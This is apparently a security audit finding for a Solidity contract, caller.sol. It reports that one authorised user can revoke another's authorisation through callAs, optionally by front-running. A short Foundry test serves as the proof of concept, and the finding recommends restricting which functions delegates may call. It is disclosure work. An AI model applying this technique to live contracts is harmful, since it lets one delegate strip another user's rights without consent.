### Impact

The caller.sol adds a functionality for a user to authorize other users to make a call on behalf on them. This is done by calling the `authorize` function from the user who want’s to authorize other users with the address of the user they want to authorize as the parameter to the function.

Let’s say a user wants to authorize 2 users A and B to make calls on behalf of them. Both the users should be at same priviledge level and user A should not be able to unauthorize user B from its priviledge. 

This vulnerability allows user A to perfrom such actions and unauthorize user B. This can also be used to unauthorize by front-running a legit transaction of user B. 

> Note: I’ve asked the team, and they consider this is not an issue, that’s why I am reported it as QA as it still feels like a priviledge issue to me and I am keeping this open to discussion.
> 

### POC

Add the following lines in `AddressDriver.t.sol`

```solidity
address internal user2 = address(1337);

function testCanunauthorizeotherusers() public {
        vm.prank(user);
        caller.authorize(address(this));
        vm.prank(user);
        caller.authorize(user2);

        bool resultfirst = caller.isAuthorized(user, user2);
        assertTrue(resultfirst, "is unauthorized");

        bytes memory callData = abi.encodeWithSelector(caller.unauthorize.selector, user2);
        caller.callAs(user, address(caller), callData);

        bool resultsecond = caller.isAuthorized(user, user2);
        assertFalse(resultsecond, "is authorized");
    }
```

### Recommendation

Only allow necessary functions to be called by authorized users.